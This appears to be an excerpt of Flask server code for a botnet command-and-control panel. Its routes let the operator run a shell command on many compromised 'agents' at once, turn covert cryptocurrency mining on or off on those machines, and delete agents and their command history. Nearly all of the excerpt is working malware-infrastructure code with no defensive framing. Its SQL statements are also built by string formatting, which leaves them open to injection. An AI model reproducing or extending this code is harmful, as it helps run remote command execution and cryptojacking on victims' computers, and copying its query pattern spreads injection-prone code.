...
@api.route('/<agent_id>/delhistory', methods=['POST'])
def del_history(agent_id):       
    db.session.execute("UPDATE agents SET output = '' where id='%s' "%agent_id)
    db.session.execute("DELETE FROM commands WHERE agent_id='%s' "%agent_id)
    db.session.commit()
    flash('History Deleted', 'danger')
    return redirect(url_for('webui.agent_detail', agent_id=agent_id)) #update this later

@api.route('/<agent_id>/set_mining', methods=['POST'])
def set_mining(agent_id):       
    if 'miner_ativate' in request.form:
        db.session.execute("UPDATE agents SET miner = '1' where id='%s' "%agent_id)    
        db.session.commit()
        flash('Mining start', 'success')
    if 'miner_desativate' in request.form:
        db.session.execute("UPDATE agents SET miner = '' where id='%s' "%agent_id)    
        db.session.commit()
        flash('Mining stop', 'danger')
    return redirect(url_for('webui.agent_detail', agent_id=agent_id)) #update this later
...
def mass_execute():
    ...
    if 'execute' in request.form:
        ...
        flash('Executed "%s" on %s agents' % (request.form['cmd'], len(selection)),'success')   
    if 'delete' in request.form:
        for agent_id in selection:
            db.session.delete(Agent.query.get(agent_id))
        db.session.commit()
        flash('Deleted %s agents' % len(selection),'danger')
    if 'miner_ativate' in request.form:
        for agent_id in selection:
            agent = Agent.query.filter_by(id=agent_id).first()
            agent.miner = '1'
        db.session.commit()
        flash('Mining %s agents' % len(selection),'success')
    if 'miner_desativate' in request.form:
        for agent_id in selection:            
            db.session.execute("UPDATE agents SET miner = '' where id='%s' "%agent_id)
        db.session.commit()
        flash('Mining stop %s agents' % len(selection),'success')
    if 'delete_history' in request.form:
        for agent_id in selection:            
            db.session.execute("UPDATE agents SET output = '' where id='%s' "%agent_id)
            db.session.execute("DELETE FROM commands WHERE agent_id='%s' "%agent_id)
        db.session.commit()
        flash('Deleted History %s agents' % len(selection),'danger')
